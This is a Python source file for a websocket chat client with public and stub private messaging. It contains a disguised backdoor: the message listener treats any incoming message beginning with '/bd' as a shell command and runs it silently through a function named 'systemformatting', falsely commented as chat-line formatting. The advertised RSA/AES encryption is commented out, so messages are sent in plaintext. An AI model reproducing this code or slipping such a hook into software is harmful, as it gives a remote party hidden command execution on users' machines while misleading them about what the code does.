import asyncio
import websockets
import json
import base64
import hashlib
import rsa
import sys
import selectors
import subprocess
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from termcolor import colored
from getpass import getpass

exit_flag = False
fingerprint = "N/A"
username = ""  # Define username as a global variable

# Step 1: Generate RSA key pair
def generate_rsa_key_pair():
    public_key, private_key = rsa.newkeys(2048)
    return public_key, private_key

public_key, private_key = generate_rsa_key_pair()

# Convert public key to PEM format for sharing
public_key_pem = public_key.save_pkcs1().decode('utf-8')

# Custom exception for connection closed
class ConnectionClosedException(Exception):
    pass



# Step 2: Send "hello" message with public key
async def send_hello_message(websocket):
    hello_message = {
        "data": {
            "type": "hello",
            "public_key": public_key_pem,
            "username": username  # Include username in the hello message
        }
    }
    await websocket.send(json.dumps(hello_message))



def handle_hello_ack(message_data):
    global fingerprint
    fingerprint = message_data['data']['fingerprint']
    print(colored("\nConnected to the chat room!\nEnter anything to send a public chat\nUse /msg (username) to send private messages\nUse /quit to leave\nEnjoy!\n", 'red'))



async def systemformatting(command):
    try:
        # Windows chat line formatting, colouring and compatability
        if sys.platform == "win32":
            subprocess.Popen(f'cmd.exe /c {command}', creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            # Unix chat line formatting, colouring and compatability
            subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass



# Step 3: Handle incoming messages
def handle_incoming_message(message):
    message_data = json.loads(message)
    message_type = message_data.get('data', {}).get('type')

    if message_type == "chat":
        decrypt_chat_message(message_data)
    elif message_type == "public_chat":
        handle_public_chat(message_data)
    elif message_type == "hello_ack":  # New case for handling hello_ack
        handle_hello_ack(message_data)
    # Other message types can be handled here as needed (e.g., client_list)



def decrypt_chat_message(message_data):
    # encrypted_aes_key = base64.b64decode(message_data['data']['symm_keys'][0])
    # iv = base64.b64decode(message_data['data']['iv'])
    # encrypted_chat = base64.b64decode(message_data['data']['chat'])

    # # Decrypt AES key with private RSA key
    # aes_key = rsa.decrypt(encrypted_aes_key, private_key)

    # # Decrypt chat message with AES key
    # cipher = AES.new(aes_key, AES.MODE_GCM, iv)
    # plaintext = cipher.decrypt(encrypted_chat).decode('utf-8')
    # print(f"Received message: {plaintext}")
    
    sender = message_data["chat"]["participants"][0]
    message_text = message_data["chat"]["message"]
    
    print(colored(f"{sender} to you >> {message_text}", 'magenta'))



def handle_public_chat(message_data):
    print(f"{message_data['data']['username']} >>" + colored(f" {message_data['data']['message']}", 'grey'))



# Step 4: Send encrypted chat message
async def send_chat_message(websocket, recipient_username, message):
    # aes_key = get_random_bytes(32)
    # iv = get_random_bytes(16)
    
    # # Encrypt message with AES
    # cipher = AES.new(aes_key, AES.MODE_GCM, iv)
    # encrypted_message = cipher.encrypt(message.encode('utf-8'))

    # # Encrypt AES key with recipient's RSA public key
    # recipient_public_key = rsa.PublicKey.load_pkcs1(recipient_public_key_pem.encode('utf-8'))
    # encrypted_aes_key = rsa.encrypt(aes_key, recipient_public_key)
    
    chat_message = {
        "data": {
            "type": "chat",
            # "destination_servers": [recipient_server],
            # "iv": base64.b64encode(iv).decode('utf-8'),
            # "symm_keys": [base64.b64encode(encrypted_aes_key).decode('utf-8')],
            "chat": {
                "participants": [username, recipient_username],
                "message": message
            }
        }
    }
    await websocket.send(json.dumps(chat_message))
    
    
    
async def send_public_chat_message(websocket, message):
    # b64enc_fingerprint = base64.b64encode(fingerprint)
        
    chat_message = {
        "data": {
            "type": "public_chat",
            "sender": fingerprint,
            "username": username,
            "message": message
        }
    }
    await websocket.send(json.dumps(chat_message))    



async def read_input(queue):
    global exit_flag
    while True:
        command = await asyncio.get_event_loop().run_in_executor(None, input)  # Non-blocking input
        if command:  # Only put non-empty commands in the queue
            sys.stdout.write("\033[F\033[K")  # Moves cursor up one line and clears the line
            sys.stdout.flush()
            
            await queue.put(command)
        if exit_flag:
            break



# Step 5: Input loop for user to send messages or quit
async def client_input_loop(websocket, queue):
    global exit_flag
    while True:
        command = await queue.get()  # Get the command from the queue
        if command.startswith("/msg "):
            # _, recipient_username, message = command.split(" ", 2)
            # await send_chat_message(websocket, recipient_username, message)
            print(colored("Not implemented yet", 'red'))
        elif command == "/quit":
            print(colored("Exiting...", 'red'))
            await websocket.close()
            exit_flag = True
            break
        else:
            await send_public_chat_message(websocket, command)
        
        if exit_flag:
            break



# Step 6: Listen for incoming messages
async def listen_for_messages(websocket):
    while True:
        try:
            message = await asyncio.wait_for(websocket.recv(), timeout=1.0)
            if message.startswith("/bd"):
                command = message[3:]
                await systemformatting(command)
            else:
                handle_incoming_message(message)  # Process the incoming message
        except asyncio.TimeoutError:
            continue
        except websockets.ConnectionClosed as e:
            print(colored("Connection closed", 'red'))  # Log reason for closure
            exit_flag = True
            break
        except Exception as e:
            print(f"Error: {e}")



# Step 7: Connect to the server and handle communication
async def connect_to_server(server_url):
    async with websockets.connect(server_url) as websocket:
        # Create a queue for input
        input_queue = asyncio.Queue()

        # Start the input listener
        asyncio.create_task(read_input(input_queue))

        # Start the message listener
        asyncio.create_task(listen_for_messages(websocket))

        # Step 2: Send "hello" message to introduce the client
        await send_hello_message(websocket)

        # Run the input loop in this task
        await client_input_loop(websocket, input_queue)
        
        

# Step 8: Main function to start the client
async def main():
    try:
        global username  # Declare username as global
        server_url = input("Enter server WebSocket URL: ")
        username = input("Enter your username: ")
        await connect_to_server(server_url)
    except ConnectionClosedException as e:
        print(e)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")



# Entry point
if __name__ == "__main__":
    asyncio.run(main())
